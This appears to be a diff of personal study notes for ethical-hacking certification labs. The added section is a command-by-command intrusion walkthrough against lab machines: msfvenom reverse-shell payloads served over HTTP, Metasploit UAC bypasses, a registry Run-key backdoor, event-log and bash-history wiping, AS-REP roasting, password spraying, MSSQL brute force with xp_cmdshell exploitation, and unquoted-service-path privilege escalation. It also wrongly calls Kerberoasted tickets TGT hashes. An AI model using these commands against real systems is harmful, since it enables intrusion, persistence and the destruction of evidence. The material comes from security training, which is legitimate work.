@@ -1,4 +1,4 @@
-1)Gather Information using Advanced Google Hacking Techniques
+2)Gather Information using Advanced Google Hacking Techniques
 In the search bar, copy and paste this search command intitle:login site:eccouncil.org. The intitle and site Google advanced operators used in this search command limit the results to pages on the eccouncil.org website that have the login pages
 EC-Council filetype:pdf ceh
 CEH-brochure.pdf 
@@ -118,7 +118,7 @@ To perform website footprinting using ShellGPT, run sgpt --chat footprint --shel
 
 ---------------------------------------------------------------------
 
-Perform Host Discovery using Nmap
+3 Perform Host Discovery using Nmap
 
 
 nmap -sn -PR [Target IP Address]. The -sn disables port scan, and -PR performs ARP ping scan The host is active when an ARP response is received
@@ -205,7 +205,7 @@ run sgpt --chat scan --shell “Run a hping3 ACK scan on port 80 of target IP 10
 
 
 ---------------------------------------------------------------------
-Perform NetBIOS Enumeration using Windows Command-Line Utilities
+4 Perform NetBIOS Enumeration using Windows Command-Line Utilities
 cmd -  nbtstat -a [IP address of the remote machine]  -  -a displays the NetBIOS name table of a remote computer
 nbtstat -c    - -c lists the contents of the NetBIOS name cache of the remote computer.
 
@@ -258,7 +258,7 @@ run the sgpt --shell “Perform NetBIOS enumeration on target IP 10.0.2.15” co
 sgpt --shell “Get NetBIOS info for IP 10.0.2.15 and display the associated names".
 
 ------------------------------------------------------------------
-Perform Vulnerability Research in Common Weakness Enumeration (CWE)
+5)Perform Vulnerability Research in Common Weakness Enumeration (CWE)
  https://cwe.mitre .org
  
 Perform Vulnerability Analysis using OpenVAS
@@ -274,6 +274,388 @@ Click on the Scans. Then Click on the Tasks
 The Task Wizard window opens; enter the target machine IP address in the IP address or hostname field. Then Click on the Start Scan button.
 
 sgpt --chat nikto --shell “Launch nikto to execute a scan against the URL https://www.certifiedhacker.com to identify potential vulnerabilities.”
+----------------------------------------------
+6
+
+Perform Active Online Attack to Crack the System's Password using Responder
+sudo responder -I eth0
+access file share from windows machine 
+Responder starts listening to the network interface for events
+cd /usr/share/responder/logs  
+pluma hash.txt  save it hash
+john hash.txt
+ 
+Gain Access to a Remote System using Reverse Shell Generator
+
+run docker run -d -p 80:80 reverse_shell_generator command to start Reverse Shell Generator
+	• docker run: Starts a new container.
+	• -d: Detached mode — runs the container in the background.
+	• -p 80:80: Maps host port 80 to container port 80, allowing access to the container's service via http://localhost.
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.1.13 LPORT=4444 -f exe -o reverse.exe
+
+		• msfvenom: Payload generation tool from the Metasploit Framework.
+		• -p windows/x64/meterpreter/reverse_tcp: Specifies a reverse TCP Meterpreter payload for 64-bit Windows.
+		• LHOST=10.10.1.13: IP address of the attacker's machine to receive the reverse shell.
+		• LPORT=4444: Port on the attacker's machine to listen for the connection.
+		• -f exe: Output format is a Windows executable.
+-o reverse.exe: Saves the payload as reverse.exe
+
+
+sudo apt install smbclient
+smbclient //10.10.1.11/Share -U user
+put movie.mp4
+
+
+got access - getuid
+
+will gain access to the remote system using PowerShell script
+
+HoaxShell section, select PowerShell IEX
+ pluma shell.ps1  save content and transfer to windows 
+ 
+ un a hoaxshell listener, to do so, switch to the Firefox browser and ensure the port number is 444, select hoaxshell from the Type drop-down under Listener section and click on Copy to copy the code..
+ 
+ Switch to the terminal window and paste the copied code to start the listener AND got access
+ 
+ Perform Buffer Overflow Attack to Gain Access to a Remote System
+ 
+ A buffer is an area of adjacent memory locations allocated to a program or application to handle its runtime data. Buffer overflow or overrun is a common vulnerability in applications or programs that accept more data than the allocated buffer. This vulnerability allows the application to exceed the buffer while writing data to the buffer and overwrite neighboring memory locations
+ 
+ ImmunityDebugger
+  attach vul.exe file 
+  Netcat command to establish a connection with the target vulnerable serve
+  
+  	23. Execute nc -nv 10.10.1.11 9999 command.
+Here, 10.10.1.11 is the IP address of the target machine (Windows 11) and 9999 is the target port.
+	28. To create a spike template for spiking on the STATS function, run pluma stats.spk command to open a text editor.
+	29. In the text editor window, type the following script:
+s_readline();
+s_string("STATS ");
+s_string_variable("0");
+generic_send_tcp 10.10.1.11 9999 stats.spk 0 0 command to send the packages to the vulnerable server.
+Here, 10.10.1.11 is the IP address of the target machine (Windows 11), 9999 is the target port number, stats.spk is the spike_script, and 0 and 0 are the values of SKIPVAR and SKIPSTR.
+
+
+In the text editor window, type the following script:
+s_readline();
+s_string("TRUN ");
+s_string_variable("0");
+
+run generic_send_tcp 10.10.1.11 9999 trun.spk 0 0 command to send the packages to the vulnerable server.
+Here, 10.10.1.11 is the IP address of the target machine (Windows 11), 9999 is the target port number, trun.spk is the spike_script, and 0 and 0 are the values of SKIPVAR and SKIPSTR.
+
+--
+ run python3 /home/attacker/converter.py command.
+This script will ask assembly code as input.
+	113. The Enter the assembly code here : prompt appears; type JMP ESP and press Enter.
+The result appears, displaying the hex code of JMP ESP (here, ffe4).
+---
+
+Perform Privilege Escalation to Gain Higher Privileges
+ 
+ 
+Escalate Privileges by Bypassing UAC and Exploiting Sticky Keys
+Sticky keys is a Windows accessibility feature that causes modifier keys to remain active, even after they are released. Sticky keys help users who have difficulty in pressing shortcut key combinations. They can be enabled by pressing Shift key for 5 times. Sticky keys also can be used to obtain unauthenticated, previleged access to the machine.
+
+ msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/Windows.exe.
+
+
+ created a directory or shared folder (share) at the location (/var/www/html) with the required access permission. So, we will use the same directory or shared folder (share) to share Windows.exe with the victim machine.
+To create a new directory to share the Windows.exe file with the target machine and provide the permissions, use the below commands
+
+
+	• Run mkdir /var/www/html/share command to create a shared folder
+	• Run chmod -R 755 /var/www/html/share command
+	• Run chown -R www-data:www-data /var/www/html/share command
+
+
+
+cp /home/attacker/Desktop/Windows.exe /var/www/html/share/
+
+
+Start the Apache server by executing service apache2 start command.
+
+
+	7. Run msfconsole command in the terminal window to launch Metasploit Framework.
+
+
+
+	8. In Metasploit type use exploit/multi/handler and press Enter.
+	9. Now, type set payload windows/meterpreter/reverse_tcp and press Enter.
+	10. Type set lhost 10.10.1.13 and press Enter to set lhost.
+	11. Type set lport 444 and press Enter to set lport.
+	12. Now, type run in the Metasploit console and press Enter.
+GO TO  http://10.10.1.13/share  DOWNLOAD AND Executable
+
+sysinfo
+getuid
+we shall try to bypass the user account control setting that is blocking you from gaining unrestricted access to the machine.
+ background 
+ search bypassuac and press Enter, to get the list of bypassuac modules
+ 
+  type use exploit/windows/local/bypassuac_fodhelper
+  Type set session 1 and press Enter.
+  Type show options in the meterpreter console and press Enter.
+  
+  	27. To set the LHOST option, type set LHOST 10.10.1.13 and press Enter.
+	28. To set the TARGET option, type set TARGET 0 and press Enter (here, 0 indicates nothing, but the Exploit Target ID).
+Type exploit and press Enter to begin the exploit on Windows 11 machine
+
+BypassUAC exploit has successfully bypassed the UAC setting on the Windows 11 machine.
+	31. Type getsystem -t 1 and press Enter to elevate privileges.
+	32. Now, type getuid and press Enter. The meterpreter session is now running with system privileges.
+
+
+	33. Type background and press Enter to background the current session.
+In this task, we will use sticky_keys module present in Metasploit to exploit the sticky keys feature in Windows 11.
+	34. Type use post/windows/manage/sticky_keys and press Enter.
+	35. Now type sessions -i* and press Enter to list the sessions in meterpreter.
+	36. In the console type set session 2 to set the privileged session as the current session.
+	37. In the console type exploit and press Enter, to begin the exploit.
+
+Maintain Remote Access and Hide Malicious Activities
+
+User System Monitoring and Surveillance using Spyrix
+ Use the user account Jason, with the password qwerty, to establish a Remote Desktop Connection with the target system. Enter the name of the target machine that will be visible in Spyrix Personal Monitor dashboard
+ 
+ 
+ Maintain Persistence by Modifying Registry Run Keys
+ 
+ Run the command msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/Test.exe to generate Test.exe payload.
+ 
+ 
+ ow, we will create payload that needs to be uploaded into the Run Registry of Windows 11 machine. Run the following command:
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=4444 -f exe > /home/attacker/Desktop/registry.exe
+
+ we already created a directory or shared folder (share) at the location (/var/www/html) with the required access permission. So, we will use the same directory or shared folder (share) to share exploit.exe with the victim machine.
+To create a new directory to share the Test.exe and registry.exe files with the target machine and provide the permissions, use the below commands:
+	• Run mkdir /var/www/html/share command to create a shared folder
+	• Run chmod -R 755 /var/www/html/share command
+	• Run chown -R www-data:www-data /var/www/html/share command
+	6. Copy the payload into the shared folder by executing cp /home/attacker/Desktop/Test.exe /var/www/html/share/ and cp /home/attacker/Desktop/registry.exe /var/www/html/share/ commands.
+Start the Apache server by running service apache2 start command.
+
+
+
+	8. Run msfconsole command to launch Metasploit Framework.
+	9. In Metasploit, type use exploit/multi/handler and press Enter.
+	10. Now, type set payload windows/meterpreter/reverse_tcp and press Enter.
+	11. Type set lhost 10.10.1.13 and press Enter to set lhost.
+	12. Type set lport 444 and press Enter to set lport.
+	13. Now, type run in the Metasploit console and press Enter.
+
+
+	20. Type getuid and press Enter to display current user ID.
+	21. Now, we shall try to bypass the User Account Control setting that is blocking you from gaining unrestricted access to the machine.
+	22. Type background and press Enter, to background the current session.
+In this task, we will bypass Windows UAC protection via SilentCleanup task present in Windows Task Scheduler. It is present in Metasploit as a bypassuac_silentcleanup exploit.
+	23. In the terminal window, type use exploit/windows/local/bypassuac_silentcleanup and press Enter.
+Now, type set session 1 and press Enter.
+
+
+	25. Type show options in the meterpreter console and press Enter.
+
+
+	26. To set the LHOST option, type set LHOST 10.10.1.13 and press Enter.
+	27. To set the TARGET option, type set TARGET 0 and press Enter (here, 0 indicates nothing, but the Exploit Target ID).
+	28. Type exploit and press Enter to begin the exploit on Windows 11 machine.
+If you get Exploit completed, but no session was created message without any session, type exploit in the console again and press Enter.
+	29. The BypassUAC exploit has successfully bypassed the UAC setting on the Windows 11 machine.
+	30. Type getsystem -t 1 and press Enter to elevate privileges.
+	31. Now, type getuid and press Enter. The Meterpreter session is now running with system privileges.
+	32. Now, to add the malicious file into the Windows 11 machine's registry, open a shell by running the shell command.
+In the elevated shell, type reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_EXPAND_SZ /d "C:\Users\Admin\Downloads\registry.exe" and press Enter.
+	34. Once the command is successfully executed, open another terminal window with root privileges and run msfconsole command.
+	35. In Metasploit, type use exploit/multi/handler and press Enter.
+	36. Now, type set payload windows/meterpreter/reverse_tcp and press Enter.
+	37. Type set lhost 10.10.1.13 and press Enter to set lhost.
+	38. Type set lport 4444 and press Enter to set lport.
+	39. Now, type exploit to start the exploitation.
+
+ restart the machine so that the malicious file that is placed in the Run Registry is executed.
+ 	42. Type getuid and press Enter, we can see that we have opened a reverse shell with admin privileges.
+
+Clear Logs to Hide the Evidence of Compromise
+run Clear_Event_Viewer_Logs.bat 
+
+	6. A Command Prompt window with Administrator privileges appears. Run wevtutil el command to display a list of event logs.
+el | enum-logs lists event log names.
+ run wevtutil cl [log_name] command (here, we are clearing system logs) to clear a specific event log.
+cl | clear-log: clears a log, log_name is the name of the log to clear, and ex: is the system, application, and security.
+	9. In Command Prompt, run cipher /w:[Drive or Folder or File Location] command to overwrite deleted files in a specific drive, folder, or file.
+Here, we are encrypting the deleted files on the C: drive. You can run this utility on the drive, folder, or file of your choice.
+
+Clear Linux Machine Logs using the BASH Shell
+
+ Parrot Security machine.
+	2. Open a Terminal window and run export HISTSIZE=0 command to disable the BASH shell from saving the history.
+HISTSIZE: determines the number of commands to be saved, which will be set to 0.
+In the Terminal window, run history -c command to clear the stored history.
+history -w command to delete the history of the current shell
+	5. Run shred ~/.bash_history command to shred the history file, making its content unreadable.
+This command is useful in cases where an investigator locates the file; because of this command, they would be unable to read any content in the history file.
+Now, run more ~/.bash_history command to view the shredded history content, as shown in the screenshot.
+
+shred ~/.bash_history && cat /dev/null > .bash_history && history -c && exit.
+
+Perform Active Directory (AD) Attacks Using Various Tools
+
+
+ Perform Initial Scans to Obtain Domain Controller IP and Domain Name
+  nmap 10.10.1.0/24 command to scan the entire subnet
+ 
+map shows that host 10.10.1.22 has port 88/TCP kerberos-sec and port 389/TCP LDAP opened
+nmap -A -sC -sV 10.10.1.22 c
+
+got domai name 
+
+
+Perform AS-REP Roasting Attack
+
+sudo 
+cd impacket/examples/
+python3 GetNPUsers.py CEH.com/ -no-pass -usersfile /root/ADtools/users.txt -dc-ip 10.10.1.22.
+	• GetNPUsers.py: Python script to retrieve AD user information.
+	• CEH.com/: Target AD domain.
+	• -no-pass: Flag to find user accounts not requiring pre-authentication.
+	• -usersfile ~/ADtools/users.txt: Path to the file with the user account list.
+	• -dc-ip 10.10.1.22: IP address of the DC to query.
+user Joshua has DONT_REQUIRE_PREAUTH set. As this user is vulnerable to AS-REP roasting, we obtain Joshua's password hash.
+	6. Copy that hash and save it as joshuahash.txt. Execute the command echo '[HASH]' > joshuahash.txt.
+Execute the command john --wordlist=/root/ADtools/rockyou.txt joshuahash.txt. This will crack the password hash and will give us the password in plain text
+
+
+
+Spray Cracked Password into Network using CrackMapExec.
+
+Spray Cracked Password into Network using CrackMapExec.
+
+cme rdp 10.10.1.0/24 -u /root/ADtools/users.txt -p "cupcake" to perform password spraying.
+	• rdp: Targets the Remote Desktop Protocol (RDP) service.
+	• 10.10.1.0/24: IP address range to target, encompassing all hosts within the subnet 10.10.1.0 with a subnet mask of 255.255.255.0.
+	• -u /root/ADtools/users.txt: Specifies the path to the file containing user accounts for authentication.
+	• -p "cupcake": Password which we cracked using AS-REP Roasting to test against the RDP service on the specified hosts.
+
+
+
+After the spray completion we find that user Mark is using the same password cupcake on host 10.10.1.40. We will now try to connect to RDP as user mark
+
+
+	6. Click on Menu and search for remmina in the search filed; then, select Remmina from the results.
+
+
+	7. In the Remmina Remote Desktop Client window, enter IP address 10.10.1.40 to connect (10.10.1.40 is the IP address of Windows 11 (AD) virtual machine ). A prompt appears asking Accept certificate? Tap yes.
+
+
+	8. In the Enter RDP authentication credentials window, enter Mark in the Username field and cupcake in the Password field; then, click OK.
+
+
+Perform Post-Enumeration using PowerView
+
+
+PowerView is a PowerShell tool designed for network and AD enumeration. It helps security professionals gather detailed information about user accounts, groups, computers, and domain trusts. PowerView is used to identify potential security weaknesses and misconfigurations in an AD environment. It is commonly employed in penetration testing and red team operations.
+
+
+
+cd /root/ADtools to move into the ADtools folder.
+
+	5. After starting the HTTP server, return to Remmina where our RDP session is active. Then, open the Firefox browser and navigate to the URL http://10.10.1.13:8000/PowerView.ps1 to automatically download the PowerView.ps1 script. Close the Firefox browser window.
+
+
+	6. Once the script is downloaded, launch PowerShell by searching for it in Windows search option.
+
+
+	7. Navigate to the Downloads folder by running the command cd Downloads. Before loading the script, run the command powershell -EP Bypass to enable script execution.
+	8. Now, execute the command . .\PowerView.ps1 to load the PowerView.ps1 script in PowerShell.
+	9. Next, execute Get-NetComputer command in PowerShell. This command will display all the information related to computers in AD. It lists all computer objects in AD, which can help in identifying network targets and mapping the AD environment.
+
+
+
+Get-NetGroup
+Get-NetUser
+
+
+Perform Attack on MSSQL service
+
+
+Save the username SQL_srv in a text file and name it as user.txt using command pluma user.txt.
+
+hydra -L user.txt -P /root/ADtools/rockyou.txt 10.10.1.30 mssql to brute force the MSSQL service password.
+
+	5. We have successfully cracked the password for SQL_srv, which is "batman". Next, we will attempt to log into the service using mssqlclient.py.
+	6. Execute command python3 /root/impacket/examples/mssqlclient.py CEH.com/SQL_srv:batman@10.10.1.30 -port 1433.
+Note the database name, which is "master" here.
+
+
+
+	7. Execute the SQL query SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.configurations WHERE name='xp_cmdshell';, returning a value of 1, indicating that xp_cmdshell is enabled on the server.
+
+
+
+	8. Now, as we know that xp_cmdshell is enabled on SQL server we can use Metasploit to exploit this service. Type exit and press Enter; then execute the command msfconsole to launch Metasploit.
+
+
+
+	9. Execute the following commands:
+	• use exploit/windows/mssql/mssql_payload
+	• set RHOST 10.10.1.30
+	• set USERNAME SQL_srv
+	• set PASSWORD batman
+	• set DATABASE master
+
+
+nce all commands are configured, type exploit and press Enter.
+
+
+	11. Once the exploitation is complete, we will be getting a Meterpreter session as show in the screenshot.
+
+
+
+	12. Type command shell and press Enter. Execute whoami command, to determine the username of the currently logged on user. Here, it is $sqlexpress which is the SQL service.
+
+
+
+Perform Privilege Escalation
+
+WinPEASx64.exe is a tool for Windows privilege escalation, identifying misconfigurations and vulnerabilities for potential exploitation.
+
+
+ cd C:\.
+ Next, move to C:\Users\Public\Downloads using cd and execute the command powershell.
+ 
+ ow, we need to host winPEASx64.exe on the attacker machine using Python. Open a new terminal, type sudo su, press Enter, and use toor as password. Execute the command cd /root/ADtools.
+ 
+ Type python3 -m http.server and press Enter to host the winPEASx64.exe file.
+ 
+ 
+ 	7. Get back to the shell terminal and type wget http://10.10.1.13:8000/winPEASx64.exe -o winpeas.exe.
+Do not end the Python sever
+
+
+Once winpeas.exe is downloaded, execute it with ./winpeas.exe.
+
+
+	9. Script execution starts; wait until the execution completes.
+	10. Once the execution is completed, observe the output. Here, we have a file named file.exe in C:\Program Files\CEH Services that is unquoted and can be exploited for privilege escalation.
+
+	11. Open a new terminal with root privileges using the command sudo su and toor as password. Execute the msfvenom -p windows/shell_reverse_tcp lhost=10.10.1.13 lport=8888 -f exe > /root/ADtools/file.exe command.
+
+
+
+Get back to our shell terminal and move to C:\Program Files\CEH Services. Execute the command cd ../../.. ; cd "Program Files/CEH Services"
+
+
+	13. Execute the command move file.exe file.bak ; wget http://10.10.1.13:8000/file.exe -o file.exe.
+
+
+Now, go to another terminal and type nc -nvlp 8888 and press Enter.
+
+=
+
+Perform Kerberoasting Attack
+
+Rubeus is a tool for exploiting Kerberos weaknesses in Windows environments. Kerberoasting is a method to extract ticket granting ticket (TGT) hashes from AD. Attackers target service accounts with associated Kerberos service principal names (SPNs). TGTs are requested from the DC for these accounts, then cracked offline to reveal user passwords. Kerberoasting exploits weak service account passwords and the nature of Kerberos authentication.
+
 
 
 -----------------------------------------
